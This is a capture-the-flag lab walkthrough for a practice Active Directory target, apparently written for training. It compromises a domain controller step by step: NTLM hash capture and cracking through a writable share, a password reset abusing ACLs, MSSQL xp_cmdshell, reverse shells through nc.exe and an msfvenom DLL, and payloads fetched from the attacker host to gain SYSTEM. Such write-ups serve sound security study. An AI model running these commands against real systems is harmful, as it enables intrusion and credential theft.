---
title: "HSL - ShareThePain"
date: 2026-03-27
categories: [HSL, HSL-AD]
tags: [Windows, AD, NTLM-Capture, Responder, ACL-Abuse, MSSQL, SeImpersonatePrivilege, GodPotato, SeManageVolumePrivilege, Ligolo]
image:
  path: /assets/img/sharethepain/sharethepain-banner.jpg
---



---
## Reconnaissance

### Port Scan

```bash
rustscan -a 10.1.2.10 -- -sC -sV
```

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: hack.smarter)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: hack.smarter)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

Classic DC fingerprint. Domain is `hack.smarter`, DC hostname is `DC01.hack.smarter`.

```bash
nxc smb 10.1.2.10 --generate-hosts-file host
cat host | sudo tee -a /etc/hosts
```

---

## SMB Enumeration

```bash
nxc smb 10.1.2.10 -u guest -p '' --shares
```

```text
SMB  10.1.40.3  445  DC01  IPC$     READ         Remote IPC
SMB  10.1.40.3  445  DC01  Share    READ,WRITE
SMB  10.1.40.3  445  DC01  NETLOGON
SMB  10.1.40.3  445  DC01  SYSVOL
```

![smb-shares](/assets/img/sharethepain/smb-shares.png)

`Share` is readable and writable as guest. A writable share means we can plant a malicious file to coerce authentication so we can drop a Windows shortcut that triggers an SMB connection back to us using the `slinky` NXC module:

```bash
nxc smb 10.1.2.10 -u guest -p '' -M slinky -o SERVER=10.200.42.34 NAME=evil
```

Start Responder to catch any incoming authentication:

```bash
sudo responder -I tun0 -A
```

```text
[SMB] NTLMv2-SSP Client   : 10.1.2.10
[SMB] NTLMv2-SSP Username : HACK\bob.ross
[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:9818ec0dc9611c5d:7390C857EE9F66B41AC3A9B0083300E4:...
```

![responder-hash](/assets/img/sharethepain/responder-hash.png)

NTLMv2 hash for `bob.ross`. Crack it:

```powershell
.\hashcat.exe -m 5600 .\hash.txt .\rockyou.txt
```

```text
BOB.ROSS::HACK:...:137Password123!@#

Status: Cracked
```

Credentials: `bob.ross:137Password123!@#`

---

## BloodHound Enumeration

```bash
rusthound-ce -d hack.smarter -u BOB.ROSS -p '137Password123!@#' -c All --zip
```

BloodHound shows that bob has full control over `alice.wonderland`:

```text
WriteOwner
   ,------------------------,
   |                        v
[BOB.ROSS]  --GenericAll--> [ALICE.WONDERLAND]
   |                        ^
   '------------------------'
        Owns
```

![bloodhound-genericall](/assets/img/sharethepain/bloodhound-genericall.png)

With full control over `alice.wonderland` we can simply reset her password:

```bash
bloodyAD --host hack.smarter -u 'bob.ross' -p '137Password123!@#' set password ALICE.WONDERLAND Password1
```

```text
[+] Password changed successfully!
```

---

## Foothold — WinRM as alice.wonderland

Alice is a member of `REMOTE MANAGEMENT USERS`:

![bloodhound-alice](/assets/img/sharethepain/bloodhound-alice.png)

```bash
nxc winrm hack.smarter -u ALICE.WONDERLAND -p Password1
```

```text
WINRM  10.1.2.10  5985  DC01  [+] hack.smarter\ALICE.WONDERLAND:Password1 (Pwn3d!)
```

```bash
ewp -i hack.smarter -u ALICE.WONDERLAND -p Password1
```

Poking around the filesystem, `SQL2019` stands out — MSSQL wasn't in the nmap results:

```text
evil-winrm-py PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          9/5/2025   8:34 PM                Program Files
d-----          9/3/2025   2:06 PM                Program Files (x86)
d-----         3/26/2026   4:03 PM                Share
d-----          9/3/2025   2:06 PM                SQL2019
d-----          9/3/2025   2:01 PM                Temp
d-r---          9/3/2025   2:54 PM                Users
d-----          9/5/2025   8:46 PM                Windows
```

Check if it's bound to localhost:

```text
evil-winrm-py PS C:\> netstat -ano | findstr 1433
```

```text
TCP    127.0.0.1:1433    0.0.0.0:0    LISTENING    4148
```

---

## Privilege Escalation — MSSQL → SeImpersonatePrivilege → GodPotato

### Ligolo-ng Tunnel

```bash
ligolo-ng » ifcreate --name ligolo
ligolo-ng » route_add --name ligolo --route 240.0.0.1/32
```

```text
evil-winrm-py PS C:\programdata> .\agent.exe -connect 10.200.42.34:11601 -ignore-cert
```

```bash
[Agent : HACK\alice.wonderland@DC01] » start
```

### MSSQL Access

```bash
nxc mssql 240.0.0.1 -u ALICE.WONDERLAND -p Password1
```

```text
MSSQL  240.0.0.1  1433  DC01  [+] hack.smarter\ALICE.WONDERLAND:Password1 (Pwn3d!)
```

`Pwn3d!` from nxc on MSSQL means Alice is a sysadmin on the instance. Connect and confirm execution context:

```bash
mssqlclient.py hack.smarter/ALICE.WONDERLAND:Password1@240.0.0.1 -windows-auth
```

![mssql-login](/assets/img/sharethepain/mssql-login.png)

```bash
SQL (HACK\alice.wonderland  dbo@master)> xp_cmdshell whoami /all
```

![mssql-whoami](/assets/img/sharethepain/mssql-whoami.png)

The MSSQL instance was running as `NT SERVICE\MSSQL$SQLEXPRESS`, a Windows virtual service account with no password that consistently carries `SeImpersonatePrivilege` — making it a reliable potato target.

Get a shell via hoaxshell through `xp_cmdshell`:

```bash
uv run hoaxshell.py -s 10.200.42.34 -p 4444
```

Paste the generated PowerShell one-liner into `xp_cmdshell`:

![hoaxshell](/assets/img/sharethepain/hoaxshell.png)

Drop GodPotato and nc.exe:

```text
PS C:\programdata> curl http://10.200.42.34/gp.exe -o gp.exe
PS C:\programdata> curl http://10.200.42.34/nc.exe -o nc.exe
```

```text
PS C:\programdata> ./gp.exe -cmd "C:\programdata\nc.exe 10.200.42.34 4445 -e cmd"
```

```text
C:\programdata> whoami
nt authority\system
```

![system-shell](/assets/img/sharethepain/system-shell.png)

---

### Method 2 — SeManageVolumePrivilege (tzres.dll Hijack)

Both `SeImpersonatePrivilege` and `SeManageVolumePrivilege` are available on this account. `SeManageVolumePrivilege` grants write access to any file on the volume regardless of ACLs — including protected `System32` paths. The abuse path targets `tzres.dll`, a timezone resource DLL that gets loaded by `systeminfo` through a SYSTEM-level process. Replacing it with a malicious DLL means that DLL executes in the SYSTEM context when `systeminfo` runs.

Generate the payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.200.42.34 LPORT=4445 -f dll -o tzres.dll
```

Transfer `SeManageVolumeExploit.exe` and the DLL:

```text
PS C:\programdata> curl http://10.200.42.34/SeManageVolumeExploit.exe -o C:\programdata\SeManageVolumeExploit.exe
PS C:\programdata> curl http://10.200.42.34/tzres.dll -o C:\programdata\tzres.dll
```

```text
PS C:\programdata> .\SeManageVolumeExploit.exe
```

```text
Entries changed: 1322
DONE
```

Copy the malicious DLL into the wbem directory where `systeminfo` loads it from:

```text
PS C:\programdata> copy C:\programdata\tzres.dll C:\Windows\System32\wbem\tzres.dll
```

Start a listener, then run `systeminfo` to force the DLL to load:

```text
PS C:\programdata> systeminfo
```

![system-dll](/assets/img/sharethepain/system-dll.png)

SYSTEM shell via DLL hijack.

---

## Attack Flow

```text
	                                  hack.smarter
	                                       |
	                            [SMB — guest READ/WRITE]
	                            Share writable as guest
	                                       |
	                            [nxc slinky + Responder]
	                            bob.ross NTLMv2 captured
	                          hashcat → 137Password123!@#
	                                       |
	                                  [BloodHound]
	                  bob.ross GenericAll/Owns → ALICE.WONDERLAND
	                                       |
	                            [bloodyAD set password]
	                           alice.wonderland:Password1
	                                       |
	                       [WinRM — REMOTE MANAGEMENT USERS]
	                             ewp foothold as alice
	                                       |
	                        [netstat → MSSQL localhost:1433]
	                          Ligolo-ng tunnel → 240.0.0.1
	                                       |
	                        [nxc mssql → Pwn3d! (sysadmin)]
	                          mssqlclient.py -windows-auth
	                            xp_cmdshell → hoaxshell
	                          NT SERVICE\MSSQL$SQLEXPRESS
	                                       |
	                    --- Method 1: SeImpersonatePrivilege ---
	                               GodPotato → SYSTEM
	                                       |
	                   --- Method 2: SeManageVolumePrivilege ---
	                                tzres.dll hijack
	                         systeminfo → DLL load → SYSTEM
	                                       |
	                                     SYSTEM
```
